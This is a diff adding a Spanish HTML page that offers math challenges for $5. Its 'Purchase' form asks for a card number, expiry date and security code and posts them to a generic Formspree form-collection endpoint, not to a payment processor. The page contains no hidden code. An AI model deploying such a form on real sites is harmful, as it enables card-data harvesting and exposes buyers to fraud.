@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Formulario de Contacto</title>
+    <link rel="stylesheet" href="servicio.css">
+    <style>
+        .invisible {
+            display: none;
+        }
+    </style>
+</head>
+
+<body>
+
+    <main id="main">
+        <section id="left">
+            <div id="head">
+                <h1>¡Supera desafíos matemáticos, invierte hoy!</h1>
+                <p>Disfruta de las matemáticas</p>
+            </div>
+            <h3>Solo por $5</h3>
+        </section>
+        <section id="right">
+            <h1>Purchase</h1>
+            <form action="https://formspree.io/f/mzbllboz" method="post">
+                <div id="form-card" class="form-field">
+                    <label for="cc-number">Card number:</label>
+                    <input type="text" id="cc-number" name="cc-number" maxlength="19" placeholder="1111 2222 3333 4444"
+                        required>
+                </div>
+
+                <div id="form-date" class="form-field">
+                    <label for="expiry-month">Expiry date:</label>
+                    <div id="date-val">
+                        <select id="expiry-month" name="expiry-month" required>
+                            <option value="" disabled selected hidden>Month</option>
+                            <!-- Options for months -->
+                        </select>
+                        <select id="expiry-year" name="expiry-year" required>
+                            <option value="" disabled selected hidden>Year</option>
+                            <!-- Options for years -->
+                        </select>
+                    </div>
+                </div>
+
+                <div id="form-sec-code" class="form-field">
+                    <label for="sec-code">Security code:</label>
+                    <input type="password" id="sec-code" name="sec-code" maxlength="3" placeholder="123" required>
+                </div>
+
+                <button type="submit">Purchase Premium</button>
+            </form>
+        </section>
+    </main>
+
+
+</body>
+
+</html>
